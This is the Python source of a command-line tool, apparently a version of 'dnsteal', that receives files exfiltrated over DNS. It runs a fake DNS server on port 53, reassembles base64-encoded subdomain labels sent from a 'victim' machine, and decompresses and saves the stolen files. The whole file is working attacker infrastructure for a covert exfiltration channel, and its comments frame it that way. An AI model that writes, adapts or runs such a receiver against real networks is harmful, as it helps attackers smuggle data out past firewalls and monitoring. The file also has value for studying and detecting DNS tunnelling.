#!/usr/bin/env python

import socket
import sys
import gzip
import json
import re
import base64

RED = "\033[1;31m"
RESET = "\033[0m"

VERSION = "3.0"


class DNSQuery:
    def __init__(self, data: bytes):
        """
        Args:
            data: The data returned from socket.recvfrom()
        """

        self.data = bytearray(data)
        self.data_text = b""

        tipo = (data[2] >> 3) & 15  # Opcode bits
        if tipo == 0:  # Standard query
            ini = 12
            lon = data[ini]
        while lon != 0:
            self.data_text += data[ini + 1 : ini + lon + 1] + b"."
            ini += lon + 1
            lon = data[ini]

        self.data_text = self.data_text.decode("utf-8")

    def reply(self, ip_address: str) -> bytes:
        """Creates a DNS response packet to be sent back to the client

        Args:
            ip_address: An IPv4 Address i.e (192.168.2.1)

        Returns:
            Packet in bytes representing a DNS response message to be sent back
            to the client. https://en.wikipedia.org/wiki/Domain_Name_System#DNS_message_format
        """

        packet = b""
        if self.data_text:
            packet += self.data[:2] + b"\x81\x80"
            packet += (
                self.data[4:6] + self.data[4:6] + b"\x00\x00\x00\x00"
            )  # Questions and Answers Counts
            packet += self.data[12:]  # Original Domain Name Question
            packet += b"\xc0\x0c"  # Pointer to domain name
            packet += b"\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"  # Response type, TTL, and resource data length -> 4 bytes
            packet += "".join(map(lambda x: chr(int(x)), ip_address.split("."))).encode(
                "utf-8"
            )  # Represent the IP address in 4 bytes
        return packet


def decode(data_received) -> dict:
    stitched_data = "".join([fragment.split(".")[0] for fragment in data_received])
    print(stitched_data)

    # subdomain = stitched_data.split(".")[0]
    contents = json.loads(
        base64.b64decode(stitched_data.encode("utf-8") + b"===")
    )  # TODO: Dude where's my padding?
    print(contents)

    for k, v in contents.items():
        with open(k, "wb+") as f:
            f.write(gzip.decompress(base64.b64decode(v)))


def usage(message=""):
    """ Displays usage information and description of command-line flags """

    banner()
    print(f"Usage: python {sys.argv[0]} [listen_address] [options]")
    print("\nOptions:")
    print("-h\tThis help menu")
    print("\n")


def banner():

    print(
        f"""{RED}
     ___  _  _ ___ _            _
    |   \\| \\| / __| |_ ___ __ _| |
    | |) | .` \\__ \\  _/ -_) _` | |
    |___/|_|\\_|___/\\__\\___\\__,_|_|v{VERSION}
    -- https://github.com/ranguli/dnsteal.git --

    File exfiltration via DNS requests
        {RESET}"""
    )


if __name__ == "__main__":

    regx_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

    if "-h" in sys.argv or len(sys.argv) < 2:
        usage()
        sys.exit(1)

    ip_address = sys.argv[1]
    port = 53

    if len(sys.argv) > 2:
        try:
            port = int(sys.argv[2])
        except (TypeError, ValueError):
            usage(f"{RED}[Error]{RESET} Port argument must be an integer.")
            sys.exit(1)

    if re.match(regx_ip, ip_address) is None:
        usage("{RED}[Error]{RESET} First argument must be listen address.")
        sys.exit(1)

    banner()

    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        udp.bind((ip_address, port))
    except socket.error:
        print(f"{RED}[Error]{RESET} Cannot bind to address {ip_address}:{port}")
        sys.exit(1)

    print(f"[+] DNS listening on {ip_address}:{port}")
    # external_ip = urllib.request.urlopen("https://ifconfig.me").read().decode("utf-8")
    print("[+] Once files have sent, use Ctrl+C to exit and save.\n")

    try:
        data_received = []
        while True:
            # There is a bottle neck in this function, if very slow PC, will take
            # slightly longer to send as this main loop recieves the data from victim.

            # Listen for requests from the client
            data, addr = udp.recvfrom(1024)

            p = DNSQuery(data)

            print(p.data_text)
            # Send back a response
            udp.sendto(p.reply(ip_address), addr)

            data_received.append(p.data_text)
            print(data_received)

    except KeyboardInterrupt:
        decode(data_received)
        print(f"\n{RED}[!]{RESET} Closing...")
        udp.close()
